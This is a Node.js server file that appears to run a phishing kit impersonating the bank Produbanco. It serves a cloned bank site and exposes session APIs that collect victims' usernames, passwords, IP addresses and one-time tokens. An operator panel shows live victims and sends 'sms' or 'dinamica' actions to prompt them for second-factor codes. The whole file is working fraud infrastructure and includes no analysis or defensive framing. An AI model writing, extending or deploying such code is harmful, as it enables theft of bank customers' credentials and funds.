import { createServer } from 'node:http'
import { existsSync } from 'node:fs'
import { readFile, stat } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const dist = path.resolve(__dirname, 'dist')
const panelDir = path.resolve(__dirname, 'panel')
const port = Number(process.env.PORT) || 4173
const mime = {
  '.css': 'text/css; charset=utf-8',
  '.html': 'text/html; charset=utf-8',
  '.ico': 'image/x-icon',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.map': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.txt': 'text/plain; charset=utf-8',
  '.webp': 'image/webp',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
}

let sessions = {}

function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for']
  const raw = forwarded ? forwarded.split(',')[0].trim() : (req.socket.remoteAddress || '127.0.0.1')
  return raw.replace('::ffff:', '')
}

function parseJsonBody(req) {
  return new Promise((resolve) => {
    let body = ''
    req.on('data', chunk => body += chunk)
    req.on('end', () => {
      try {
        resolve(JSON.parse(body || '{}'))
      } catch {
        resolve({})
      }
    })
  })
}

function resolvePath(url = '/') {
  const pathname = decodeURIComponent(new URL(url, 'http://localhost').pathname)
  const resolved = path.resolve(dist, `.${path.posix.normalize(pathname)}`)
  if (resolved !== dist && !resolved.startsWith(`${dist}${path.sep}`)) return null
  return resolved
}

const server = createServer(async (req, res) => {
  const parsedUrl = new URL(req.url, `http://localhost:${port}`)
  const pathname = decodeURIComponent(parsedUrl.pathname)

  // 1. API ROUTES
  if (pathname === '/api/sessions' && req.method === 'POST') {
    const data = await parseJsonBody(req)
    const id = data.id
    if (!id) {
      res.writeHead(400, { 'Content-Type': 'application/json' }).end(JSON.stringify({ error: 'Missing id' }))
      return
    }
    const ip = data.ip || getClientIp(req)
    const userVal = data.user || data.username
    const claveVal = data.clave || data.password
    const tipoVal = data.tipo || data.tipoUsuario || 'Banca Personas'
    const deviceVal = data.device || 'desktop'

    if (sessions[id]) {
      sessions[id] = {
        ...sessions[id],
        user: (userVal !== undefined && userVal !== '' && userVal !== '—') ? userVal : sessions[id].user,
        username: (userVal !== undefined && userVal !== '' && userVal !== '—') ? userVal : sessions[id].username,
        clave: (claveVal !== undefined && claveVal !== '' && claveVal !== '—') ? claveVal : sessions[id].clave,
        password: (claveVal !== undefined && claveVal !== '' && claveVal !== '—') ? claveVal : sessions[id].password,
        tipo: tipoVal || sessions[id].tipo,
        tipoUsuario: tipoVal || sessions[id].tipoUsuario,
        device: deviceVal || sessions[id].device,
        ip: ip || sessions[id].ip,
        state: data.state || sessions[id].state,
        token: data.token !== undefined ? data.token : sessions[id].token,
        last_seen: Date.now(),
        updatedAt: Date.now()
      }
    } else {
      sessions[id] = {
        id,
        index: Object.keys(sessions).length + 1,
        user: userVal || '—',
        username: userVal || '—',
        clave: claveVal || '—',
        password: claveVal || '—',
        tipo: tipoVal,
        tipoUsuario: tipoVal,
        device: deviceVal,
        ip: ip || '127.0.0.1',
        state: data.state || 'typing',
        token: data.token || '',
        createdAt: Date.now(),
        last_seen: Date.now(),
        updatedAt: Date.now()
      }
    }
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ success: true, session: sessions[id] }))
    return
  }

  if (pathname === '/api/sessions' && req.method === 'GET') {
    const now = Date.now()
    const list = Object.values(sessions).map(s => ({
      ...s,
      online: now - s.last_seen < 20000
    }))
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify(list))
    return
  }

  if (pathname.startsWith('/api/sessions/') && pathname.endsWith('/ping') && req.method === 'POST') {
    const parts = pathname.split('/')
    const id = parts[3]
    if (sessions[id]) {
      sessions[id].last_seen = Date.now()
    }
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ success: true }))
    return
  }

  if (pathname.startsWith('/api/sessions/') && pathname.endsWith('/state') && req.method === 'POST') {
    const parts = pathname.split('/')
    const id = parts[3]
    const data = await parseJsonBody(req)
    if (sessions[id]) {
      if (data.state !== undefined) sessions[id].state = data.state
      if (data.token !== undefined) sessions[id].token = data.token
      const userVal = data.user || data.username
      const claveVal = data.clave || data.password
      if (userVal !== undefined && userVal !== '' && userVal !== '—') {
        sessions[id].user = userVal
        sessions[id].username = userVal
      }
      if (claveVal !== undefined && claveVal !== '' && claveVal !== '—') {
        sessions[id].clave = claveVal
        sessions[id].password = claveVal
      }
      sessions[id].last_seen = Date.now()
      sessions[id].updatedAt = Date.now()
    }
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ success: true }))
    return
  }

  if (pathname.startsWith('/api/sessions/') && pathname.endsWith('/action') && req.method === 'POST') {
    const parts = pathname.split('/')
    const id = parts[3]
    const data = await parseJsonBody(req)
    if (sessions[id]) {
      if (data.state !== undefined) sessions[id].state = data.state
      sessions[id].action = data.action
      if (data.action === 'dinamica' || data.action === 'sms') {
        sessions[id].token = ''
      }
      sessions[id].last_seen = Date.now()
      sessions[id].updatedAt = Date.now()
    }
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ success: true }))
    return
  }

  if (pathname.startsWith('/api/sessions/') && req.method === 'GET') {
    const parts = pathname.split('/')
    const id = parts[3]
    const session = sessions[id]
    if (!session) {
      res.writeHead(404, { 'Content-Type': 'application/json' }).end(JSON.stringify({ error: 'Not found' }))
      return
    }
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify(session))
    return
  }

  if (pathname === '/api/clear' && req.method === 'POST') {
    sessions = {}
    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ success: true }))
    return
  }

  // 2. PANEL ROUTES (/panel and /panel/*)
  if (pathname === '/panel' || pathname === '/panel/') {
    const file = path.join(panelDir, 'index.html')
    if (existsSync(file)) {
      const body = await readFile(file)
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }).end(body)
      return
    }
  }
  if (pathname.startsWith('/panel/')) {
    const subPath = pathname.slice('/panel/'.length)
    const file = path.join(panelDir, subPath)
    if (existsSync(file)) {
      const body = await readFile(file)
      const ext = path.extname(file)
      res.writeHead(200, { 'Content-Type': mime[ext] || 'application/octet-stream' }).end(body)
      return
    }
  }

  // 3. PRODUBANCO STATIC SERVING (ORIGINAL)
  const target = resolvePath(req.url)
  if (!target) {
    res.writeHead(400).end('Bad request')
    return
  }

  let file = target
  try {
    const info = await stat(file)
    if (info.isDirectory()) file = path.join(file, 'index.html')
  } catch {
    file = path.join(dist, 'index.html')
  }

  if (!existsSync(file) || !path.extname(file)) {
    file = path.join(dist, 'index.html')
  }

  try {
    const body = await readFile(file)
    res
      .writeHead(200, {
        'Content-Type': mime[path.extname(file)] || 'application/octet-stream',
      })
      .end(body)
  } catch {
    res.writeHead(500).end('Server error')
  }
})

server.listen(port, '0.0.0.0', () => {
  console.log(`appprodu listening on ${port}`)
})
